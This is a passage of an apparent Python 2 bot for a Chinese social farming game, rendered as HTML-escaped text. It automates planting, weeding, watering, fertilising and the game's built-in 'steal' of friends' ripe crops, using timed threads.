== 6 and land['j']==s[0]['maturingTime'] or land['b']==7:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.scarity(self.uid,i) #翻地<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;for seed in self.bag['1']: #种值 if seed['type']==1:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.plant(seed['cId'],self.uid,i)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed+=u'已种'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.getBag()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:#别人的地<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if 1==land['n']:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed=u'偷过'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif land['b']==7:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed=u'已收'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif land['m']==land['l']:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed=u'偷光'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif self.autosteal: #偷<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;temp=self.steal(friend['userId'],i)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if temp.has_key('harvest'):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed=u'偷得%d' % temp['harvest']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif temp['direction']=='':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print temp<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print temp<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raise Exception<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else: #未成熟<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (durtime-int(time.time())) &lt; interval:#开新线程偷<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'set Thread %s' % time.ctime(durtime)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if friend['userId']==self.uid:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;temp = -1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;temp = friend['userId']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;thread.start_new_thread(threadSteal,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;(self,durtime,temp,i))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if not ret.has_key(friend['userId']) or ret[friend['userId']] &gt; durtime:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ret[friend['userId']]=durtime<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed=time.ctime(durtime)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if friend['userId']==self.uid and self.autofert: #自动施肥<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;temp=(int(time.time())-land['q'])/(int(s[0]['growthCycle'])/5)-land['o']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if not temp &lt; 0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;temp=self.fert(i)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if temp.has_key('direction'):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed+=temp['direction']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed+=u'施肥'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if land['f'] &gt; 0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;weed=str(land['f'])+u'草,已除'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while self.autoweed and land['f']&gt;0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.clearWeed(friend['userId'],i)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;land['f']-=1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;weed=''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if land['h']==0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;han=u'干旱,已浇水'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.autowater:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 